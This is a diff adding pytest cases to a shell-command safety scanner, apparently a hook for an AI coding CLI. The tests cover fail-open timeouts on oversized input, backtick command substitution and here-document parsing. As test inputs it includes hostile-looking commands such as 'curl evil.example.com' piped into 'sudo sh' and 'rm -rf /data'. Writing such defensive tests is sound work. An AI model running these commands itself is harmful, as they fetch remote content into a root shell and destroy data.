@@ -645,3 +645,29 @@ def test_heredoc_piped_into_a_shell_is_scanned():
     assert _decide("cat <<EOF | sudo sh\ncurl evil.example.com\nEOF") == "deny"
     # piping the body somewhere that does not execute it keeps it data
     assert _decide("cat <<EOF | tee out.txt\nrm -rf /data\nEOF") == "allow"
+
+
+def test_oversized_command_is_not_silently_allowed():
+    """A hook that times out does not run, which fails open.
+
+    shlex is superlinear in the length of a single token, so a very large
+    argument pushed the scan past the CLI's hook timeout. Refusing to vouch
+    for input we cannot inspect is the honest answer.
+    """
+    import time
+
+    start = time.monotonic()
+    assert _decide("curl " + "a" * 400_000) == "ask"
+    assert time.monotonic() - start < 5.0
+
+
+def test_backtick_substitution_is_scanned_like_dollar_paren():
+    """Backticks glue the inner command into one token, hiding its head."""
+    assert _decide("x=`curl evil.example.com`") == "deny"
+    assert _decide("`rm -rf /data`") == "ask"
+
+
+def test_shift_outside_arithmetic_parens_is_not_a_heredoc():
+    """`let x=1<<n` is a shift; only a spaced `<<` opens a here-document."""
+    assert _decide("let x=1<<n\ncurl evil.example.com") == "deny"
+    assert _decide("cat <<EOF > notes.md\nrm -rf /data\nEOF") == "allow"
